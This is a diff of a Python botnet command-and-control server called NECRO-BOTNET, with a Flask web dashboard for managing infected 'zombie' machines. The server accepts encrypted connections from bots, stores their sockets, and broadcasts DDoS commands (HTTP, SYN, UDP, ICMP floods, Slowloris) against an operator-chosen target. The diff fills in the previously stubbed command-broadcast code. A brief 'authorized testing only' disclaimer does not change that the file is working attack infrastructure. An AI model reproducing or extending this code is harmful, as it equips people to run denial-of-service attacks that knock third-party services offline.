@@ -1,30 +1,55 @@
 #!/usr/bin/env python3
 """
-NECRO-BOTNET C2 Server – CAT(c) 2026
-Run: python3 necrobots_server.py
+NECRO-BOTNET C2 Server
+
+Copyright (c) 2026 wsuits6
+Licensed under MIT License - See LICENSE file
+
+Description:
+    Command and Control server for the NECRO-BOTNET framework.
+    Provides a web dashboard for managing zombie nodes and launching attacks.
+
+Usage:
+    python3 c2_server.py [--host HOST] [--port PORT] [--attack-port PORT]
+
+Requirements:
+    pip install flask flask-socketio cryptography
+
+Disclaimer:
+    This software is for authorized security testing and educational purposes only.
+    Unauthorized use is illegal and unethical.
 """
 
 import os
+import sys
 import json
 import time
 import socket
-import threading
 import hashlib
 import base64
+import argparse
+import threading
 from datetime import datetime
-from flask import Flask, render_template, jsonify, request, send_from_directory
+
+from flask import Flask, render_template, jsonify, request
 from flask_socketio import SocketIO, emit
 from cryptography.fernet import Fernet
 
-# ============ CONFIG ============
-C2_HOST = "0.0.0.0"
-C2_PORT = 5000
-ATTACK_PORT = 4444
+
+# ============ Configuration Constants ============
+
+DEFAULT_C2_HOST = "0.0.0.0"
+DEFAULT_C2_PORT = 5000
+DEFAULT_ATTACK_PORT = 4444
+
+# Encryption key (derived from secret)
 SECRET_KEY = base64.b64encode(hashlib.sha256(b"NECRO_BOTNET_2026_SUPREME").digest())
 crypto = Fernet(SECRET_KEY)
 
-# ============ GLOBALS ============
-zombies = {}  # {zombie_id: {ip, last_seen, status, attack_power}}
+
+# ============ Global State ============
+
+zombies = {}
 attack_target = None
 attack_type = None
 attack_running = False
@@ -36,28 +61,62 @@ attack_stats = {
 }
 zombie_lock = threading.Lock()
 
-# ============ FLASK APP ============
+
+# ============ Flask Application ============
+
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'NECRO_BOTNET_SECRET'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# ============ C2 PROTOCOL (encrypted) ============
+
+# ============ Encryption Functions ============
+
 def encrypt_message(msg):
+    """
+    Encrypt a message using Fernet symmetric encryption.
+    
+    Args:
+        msg: Dictionary message to encrypt
+        
+    Returns:
+        Base64-encoded encrypted string
+    """
     return crypto.encrypt(json.dumps(msg).encode()).decode()
 
+
 def decrypt_message(data):
+    """
+    Decrypt a Fernet-encrypted message.
+    
+    Args:
+        data: Base64-encoded encrypted string
+        
+    Returns:
+        Decrypted dictionary, or None on failure
+    """
     try:
         decrypted = crypto.decrypt(data.encode())
         return json.loads(decrypted.decode())
-    except:
+    except Exception:
         return None
 
-# ============ ZOMBIE HANDLER ============
+
+# ============ Zombie Management ============
+
 def handle_zombie(conn, addr):
+    """
+    Handle communication with a connected zombie node.
+    
+    Args:
+        conn: Socket connection object
+        addr: Tuple of (IP, port)
+    """
     global zombies, attack_running, attack_stats
     
+    # Generate unique zombie ID
     zombie_id = hashlib.md5(f"{addr[0]}:{time.time()}".encode()).hexdigest()[:8]
     
+    # Register zombie
     with zombie_lock:
         zombies[zombie_id] = {
             "ip": addr[0],
@@ -65,7 +124,8 @@ def handle_zombie(conn, addr):
             "last_seen": time.time(),
             "status": "online",
             "attack_power": 0,
-            "os": "unknown"
+            "os": "unknown",
+            "conn": conn
         }
     
     socketio.emit('zombie_joined', {
@@ -74,19 +134,19 @@ def handle_zombie(conn, addr):
         'total': len(zombies)
     })
     
-    print(f"[+] Zombie {zombie_id} connected from {addr[0]}")
+    print(f"[+] Zombie {zombie_id} connected from {addr[0]}:{addr[1]}")
     
     try:
         while True:
-            data = conn.recv(4096).decode()
+            data = conn.recv(4096)
             if not data:
                 break
             
-            msg = decrypt_message(data)
+            msg = decrypt_message(data.decode())
             if not msg:
                 continue
             
-            # Heartbeat
+            # Handle heartbeat
             if msg.get('type') == 'heartbeat':
                 with zombie_lock:
                     zombies[zombie_id]['last_seen'] = time.time()
@@ -96,19 +156,19 @@ def handle_zombie(conn, addr):
                     if 'os' in msg:
                         zombies[zombie_id]['os'] = msg['os']
                 
-                # Send current attack command
+                # Send attack command if active
                 if attack_running and attack_target:
                     cmd = {
                         'type': 'attack',
                         'target': attack_target,
                         'method': attack_type,
-                        'duration': 3600  # 1 hour default
+                        'duration': 3600
                     }
                     conn.send(encrypt_message(cmd).encode())
                 else:
                     conn.send(encrypt_message({'type': 'idle'}).encode())
             
-            # Attack report
+            # Handle attack report
             elif msg.get('type') == 'report':
                 with zombie_lock:
                     attack_stats['packets_sent'] += msg.get('packets', 0)
@@ -126,6 +186,7 @@ def handle_zombie(conn, addr):
         with zombie_lock:
             if zombie_id in zombies:
                 zombies[zombie_id]['status'] = 'offline'
+                del zombies[zombie_id]['conn']
         socketio.emit('zombie_left', {
             'id': zombie_id,
             'total': len(zombies)
@@ -133,12 +194,26 @@ def handle_zombie(conn, addr):
         conn.close()
         print(f"[-] Zombie {zombie_id} disconnected")
 
-# ============ ATTACK COMMAND ============
+
+# ============ Attack Functions ============
+
 def start_attack(target, method):
+    """
+    Start an attack on the specified target.
+    
+    Args:
+        target: Target IP or domain
+        method: Attack method (http, syn, udp, icmp, slowloris)
+        
+    Returns:
+        Dictionary with status and message
+    """
     global attack_running, attack_target, attack_type, attack_stats
     
-    if not zombies:
-        return {"status": "error", "message": "No zombies available"}
+    with zombie_lock:
+        online_zombies = [z for z in zombies.values() if z['status'] == 'online']
+        if not online_zombies:
+            return {"status": "error", "message": "No online zombies available"}
     
     attack_running = True
     attack_target = target
@@ -147,7 +222,7 @@ def start_attack(target, method):
     attack_stats['packets_sent'] = 0
     attack_stats['bytes_sent'] = 0
     
-    # Broadcast attack command to all zombies
+    # Broadcast attack command
     cmd = {
         'type': 'attack',
         'target': target,
@@ -155,70 +230,107 @@ def start_attack(target, method):
         'duration': 3600
     }
     
-    encrypted_cmd = encrypt_message(cmd)
     with zombie_lock:
         for zombie_id, info in zombies.items():
-            if info['status'] == 'online':
+            if info['status'] == 'online' and 'conn' in info:
                 try:
-                    # We need to send via the zombie's socket
-                    # In production, we'd store sockets
-                    pass
-                except:
+                    info['conn'].send(encrypt_message(cmd).encode())
+                except Exception:
                     pass
     
     socketio.emit('attack_started', {
         'target': target,
         'method': method,
-        'zombies': len([z for z in zombies.values() if z['status'] == 'online'])
+        'zombies': len(online_zombies)
     })
     
+    print(f"[+] Attack started on {target} using {method}")
     return {"status": "success", "message": f"Attack started on {target}"}
 
+
 def stop_attack():
+    """
+    Stop the current attack.
+    
+    Returns:
+        Dictionary with status and message
+    """
     global attack_running, attack_target, attack_type
     
     attack_running = False
     attack_target = None
     attack_type = None
     
+    # Send idle command to all zombies
+    cmd = {'type': 'idle'}
+    with zombie_lock:
+        for zombie_id, info in zombies.items():
+            if info['status'] == 'online' and 'conn' in info:
+                try:
+                    info['conn'].send(encrypt_message(cmd).encode())
+                except Exception:
+                    pass
+    
     socketio.emit('attack_stopped', {})
+    print("[+] Attack stopped")
     return {"status": "success", "message": "Attack stopped"}
 
-# ============ WEB ROUTES ============
+
+# ============ Web Routes ============
+
 @app.route('/')
 def dashboard():
+    """Render the main dashboard."""
     return render_template('dashboard.html')
+
 
 @app.route('/api/zombies')
 def get_zombies():
+    """Get list of all zombies."""
     with zombie_lock:
+        zombie_list = {k: {kk: vv for kk, vv in v.items() if kk != 'conn'} 
+                       for k, v in zombies.items()}
         online = len([z for z in zombies.values() if z['status'] == 'online'])
         total = len(zombies)
         return jsonify({
             'total': total,
             'online': online,
-            'zombies': zombies
+            'zombies': zombie_list
         })
+
 
 @app.route('/api/attack/start', methods=['POST'])
 def api_start_attack():
+    """API endpoint to start an attack."""
     data = request.json
+    if not data:
+        return jsonify({"status": "error", "message": "No data provided"}), 400
+    
     target = data.get('target')
     method = data.get('method', 'http')
+    
+    valid_methods = ['http', 'syn', 'udp', 'icmp', 'slowloris']
+    if method not in valid_methods:
+        return jsonify({"status": "error", "message": f"Invalid method. Use: {valid_methods}"}), 400
     
     if not target:
         return jsonify({"status": "error", "message": "Target required"}), 400
     
     result = start_attack(target, method)
-    return jsonify(result)
+    status_code = 200 if result['status'] == 'success' else 400
+    return jsonify(result), status_code
+
 
 @app.route('/api/attack/stop', methods=['POST'])
 def api_stop_attack():
+    """API endpoint to stop an attack."""
     result = stop_attack()
     return jsonify(result)
 
+
 @app.route('/api/stats')
 def get_stats():
+    """Get current attack statistics."""
     with zombie_lock:
         online = len([z for z in zombies.values() if z['status'] == 'online'])
         total = len(zombies)
@@ -239,36 +351,47 @@ def get_stats():
         }
     })
 
-# ============ SOCKET.IO EVENTS ============
+
+# ============ Socket.IO Events ============
+
 @socketio.on('connect')
 def handle_connect():
-    print(f"[+] Web client connected")
+    """Handle new WebSocket connection."""
+    print("[+] Web client connected")
     with zombie_lock:
         online = len([z for z in zombies.values() if z['status'] == 'online'])
         emit('zombie_count', {'online': online, 'total': len(zombies)})
 
-# ============ C2 SOCKET SERVER (for zombies) ============
-def c2_server():
+
+# ============ C2 Socket Server ============
+
+def c2_server(host, port):
+    """
+    C2 socket server for zombie connections.
+    
+    Args:
+        host: Bind address
+        port: Bind port
+    """
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((C2_HOST, ATTACK_PORT))
+    server.bind((host, port))
     server.listen(100)
-    print(f"[*] C2 listening on {C2_HOST}:{ATTACK_PORT}")
+    print(f"[*] C2 listening on {host}:{port}")
     
     while True:
-        conn, addr = server.accept()
-        thread = threading.Thread(target=handle_zombie, args=(conn, addr))
-        thread.daemon = True
-        thread.start()
+        try:
+            conn, addr = server.accept()
+            thread = threading.Thread(target=handle_zombie, args=(conn, addr))
+            thread.daemon = True
+            thread.start()
+        except Exception as e:
+            print(f"[-] Accept error: {e}")
 
-# ============ MAIN ============
-if __name__ == '__main__':
-    # Create templates folder
-    os.makedirs('templates', exist_ok=True)
-    
-    # Write dashboard HTML
-    dashboard_html = '''
-<!DOCTYPE html>
+
+# ============ Dashboard Template ============
+
+DASHBOARD_HTML = '''<!DOCTYPE html>
 <html>
 <head>
     <title>NECRO-BOTNET C2 Dashboard</title>
@@ -302,7 +425,7 @@ if __name__ == '__main__':
 <body>
 <div class="container">
     <div class="header">
-        <h1>☠ NECRO-BOTNET v1.0</h1>
+        <h1>NECRO-BOTNET v1.0</h1>
         <div id="timestamp" style="color: #888;"></div>
     </div>
     
@@ -325,13 +448,13 @@ if __name__ == '__main__':
             <option value="icmp">ICMP Flood</option>
             <option value="slowloris">Slowloris</option>
         </select>
-        <button onclick="startAttack()">▶ START ATTACK</button>
-        <button onclick="stopAttack()" style="background: #ff4444; color: #fff;">■ STOP ATTACK</button>
+        <button onclick="startAttack()">START ATTACK</button>
+        <button onclick="stopAttack()" style="background: #ff4444; color: #fff;">STOP ATTACK</button>
     </div>
     
     <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px;">
         <div class="zombie-list">
-            <h3>🧟 Zombie Army</h3>
+            <h3>Zombie Army</h3>
             <div id="zombieList"></div>
         </div>
         <div>
@@ -341,12 +464,12 @@ if __name__ == '__main__':
     </div>
     
     <div class="chart-container">
-        <h3>📊 Attack Traffic</h3>
+        <h3>Attack Traffic</h3>
         <canvas id="liveChart"></canvas>
     </div>
     
     <div class="attack-log" id="attackLog">
-        <h3>📋 Attack Log</h3>
+        <h3>Attack Log</h3>
     </div>
 </div>
 
@@ -356,170 +479,108 @@ if __name__ == '__main__':
     let packetData = [];
     let timeLabels = [];
     
-    // Connect to socket
-    socket.on('connect', () => {
-        addLog('Connected to C2 server');
-    });
-    
-    socket.on('zombie_joined', (data) => {
-        addLog(`🧟 Zombie ${data.id} joined from ${data.ip} (Total: ${data.total})`);
-        updateStats();
-    });
-    
-    socket.on('zombie_left', (data) => {
-        addLog(`💀 Zombie ${data.id} disconnected (Total: ${data.total})`);
-        updateStats();
-    });
-    
-    socket.on('attack_started', (data) => {
-        addLog(`⚔️ Attack started on ${data.target} using ${data.method} (${data.zombies} zombies)`);
-        updateStats();
-    });
-    
-    socket.on('attack_stopped', () => {
-        addLog('🛑 Attack stopped');
-        updateStats();
-    });
-    
+    socket.on('connect', () => { addLog('Connected to C2 server'); });
+    socket.on('zombie_joined', (data) => { addLog(`Zombie ${data.id} joined from ${data.ip}`); updateStats(); });
+    socket.on('zombie_left', (data) => { addLog(`Zombie ${data.id} disconnected`); updateStats(); });
+    socket.on('attack_started', (data) => { addLog(`Attack started on ${data.target} (${data.zombies} zombies)`); updateStats(); });
+    socket.on('attack_stopped', () => { addLog('Attack stopped'); updateStats(); });
     socket.on('attack_update', (data) => {
-        // Update chart
         const now = new Date().toLocaleTimeString();
         timeLabels.push(now);
         packetData.push(data.packets);
-        if (timeLabels.length > 60) {
-            timeLabels.shift();
-            packetData.shift();
-        }
+        if (timeLabels.length > 60) { timeLabels.shift(); packetData.shift(); }
         updateChart();
         updateStats();
     });
     
     function updateStats() {
-        fetch('/api/stats')
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById('totalZombies').textContent = data.zombies.total;
-                document.getElementById('onlineZombies').textContent = data.zombies.online;
-                document.getElementById('attackStatus').textContent = data.attack.running ? `ATTACKING ${data.attack.target}` : 'Idle';
-                document.getElementById('packetsSent').textContent = data.attack.packets.toLocaleString();
-                document.getElementById('bytesSent').textContent = (data.attack.bytes / 1024 / 1024).toFixed(2) + ' MB';
-                document.getElementById('uptime').textContent = data.attack.duration + 's';
-                
-                // Attack power (estimated)
-                const power = (data.attack.packets / (data.attack.duration || 1)) * 1500 / 1024 / 1024 / 1024;
-                document.getElementById('attackPower').textContent = power.toFixed(2) + ' Gbps';
+        fetch('/api/stats').then(res => res.json()).then(data => {
+            document.getElementById('totalZombies').textContent = data.zombies.total;
+            document.getElementById('onlineZombies').textContent = data.zombies.online;
+            document.getElementById('attackStatus').textContent = data.attack.running ? `ATTACKING ${data.attack.target}` : 'Idle';
+            document.getElementById('packetsSent').textContent = data.attack.packets.toLocaleString();
+            document.getElementById('bytesSent').textContent = (data.attack.bytes / 1024 / 1024).toFixed(2) + ' MB';
+            document.getElementById('uptime').textContent = data.attack.duration + 's';
+            const power = (data.attack.packets / (data.attack.duration || 1)) * 1500 / 1024 / 1024 / 1024;
+            document.getElementById('attackPower').textContent = power.toFixed(2) + ' Gbps';
+        });
+        fetch('/api/zombies').then(res => res.json()).then(data => {
+            const list = document.getElementById('zombieList');
+            list.innerHTML = '';
+            Object.entries(data.zombies).forEach(([id, info]) => {
+                const div = document.createElement('div');
+                div.className = 'zombie-entry';
+                div.innerHTML = `<span>${id} (${info.ip})</span><span class="status ${info.status}">${info.status.toUpperCase()}</span><span>${info.os || 'unknown'}</span><span>${info.attack_power || 0} pps</span>`;
+                list.appendChild(div);
             });
-        
-        fetch('/api/zombies')
-            .then(res => res.json())
-            .then(data => {
-                const list = document.getElementById('zombieList');
-                list.innerHTML = '';
-                Object.entries(data.zombies).forEach(([id, info]) => {
-                    const div = document.createElement('div');
-                    div.className = 'zombie-entry';
-                    div.innerHTML = `
-                        <span>${id} (${info.ip})</span>
-                        <span class="status ${info.status}">${info.status.toUpperCase()}</span>
-                        <span>${info.os || 'unknown'}</span>
-                        <span>${info.attack_power || 0} pps</span>
-                    `;
-                    list.appendChild(div);
-                });
-            });
+        });
     }
     
     function updateChart() {
         if (!chart) {
             const ctx = document.getElementById('liveChart').getContext('2d');
-            chart = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: timeLabels,
-                    datasets: [{
-                        label: 'Packets/sec',
-                        data: packetData,
-                        borderColor: '#00ff41',
-                        backgroundColor: 'rgba(0, 255, 65, 0.1)',
-                        fill: true
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: { labels: { color: '#00ff41' } }
-                    },
-                    scales: {
-                        x: { ticks: { color: '#888' } },
-                        y: { ticks: { color: '#888' } }
-                    }
-                }
-            });
-        } else {
-            chart.update();
-        }
+            chart = new Chart(ctx, { type: 'line', data: { labels: timeLabels, datasets: [{ label: 'Packets/sec', data: packetData, borderColor: '#00ff41', backgroundColor: 'rgba(0, 255, 65, 0.1)', fill: true }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#00ff41' } } }, scales: { x: { ticks: { color: '#888' } }, y: { ticks: { color: '#888' } } } } });
+        } else { chart.update(); }
     }
     
     function startAttack() {
         const target = document.getElementById('target').value;
         const method = document.getElementById('method').value;
-        if (!target) {
-            alert('Please enter a target');
-            return;
-        }
-        fetch('/api/attack/start', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ target, method })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'success') {
-                addLog(`✅ ${data.message}`);
-            } else {
-                addLog(`❌ ${data.message}`);
-            }
-        });
+        if (!target) { alert('Please enter a target'); return; }
+        fetch('/api/attack/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target, method }) })
+            .then(res => res.json()).then(data => { addLog(data.status === 'success' ? data.message : `Error: ${data.message}`); });
     }
     
     function stopAttack() {
-        fetch('/api/attack/stop', { method: 'POST' })
-            .then(res => res.json())
-            .then(data => {
-                addLog(`✅ ${data.message}`);
-            });
+        fetch('/api/attack/stop', { method: 'POST' }).then(res => res.json()).then(data => { addLog(data.message); });
     }
     
     function addLog(msg) {
         const log = document.getElementById('attackLog');
         const entry = document.createElement('div');
         entry.className = 'entry';
-        const time = new Date().toLocaleTimeString();
-        entry.textContent = `[${time}] ${msg}`;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
         log.appendChild(entry);
         log.scrollTop = log.scrollHeight;
     }
     
-    // Update stats every 2 seconds
     setInterval(updateStats, 2000);
-    
-    // Timestamp
-    setInterval(() => {
-        document.getElementById('timestamp').textContent = new Date().toLocaleString();
-    }, 1000);
+    setInterval(() => { document.getElementById('timestamp').textContent = new Date().toLocaleString(); }, 1000);
 </script>
 </body>
-</html>
-'''
+</html>'''
+
+
+# ============ Main Entry Point ============
+
+def main():
+    parser = argparse.ArgumentParser(description="NECRO-BOTNET C2 Server")
+    parser.add_argument("--host", default=DEFAULT_C2_HOST, help="Bind address")
+    parser.add_argument("--port", type=int, default=DEFAULT_C2_PORT, help="Web dashboard port")
+    parser.add_argument("--attack-port", type=int, default=DEFAULT_ATTACK_PORT, help="C2 socket port")
+    args = parser.parse_args()
     
+    # Create templates directory
+    os.makedirs('templates', exist_ok=True)
+    
+    # Write dashboard HTML
     with open('templates/dashboard.html', 'w') as f:
-        f.write(dashboard_html)
+        f.write(DASHBOARD_HTML)
+    
+    print("""
+    NECRO-BOTNET C2 Server v1.0
+    ===========================
+    Web Dashboard: http://{}:{}
+    C2 Socket:     {}:{}
+    """.format(args.host, args.port, args.host, args.attack_port))
     
     # Start C2 server thread
-    c2_thread = threading.Thread(target=c2_server, daemon=True)
+    c2_thread = threading.Thread(target=c2_server, args=(args.host, args.attack_port), daemon=True)
     c2_thread.start()
     
     # Start web server
-    print("[*] Starting web dashboard on http://0.0.0.0:5000")
-    socketio.run(app, host=C2_HOST, port=C2_PORT, debug=False)
+    socketio.run(app, host=args.host, port=args.port, debug=False)
+
+
+if __name__ == '__main__':
+    main()
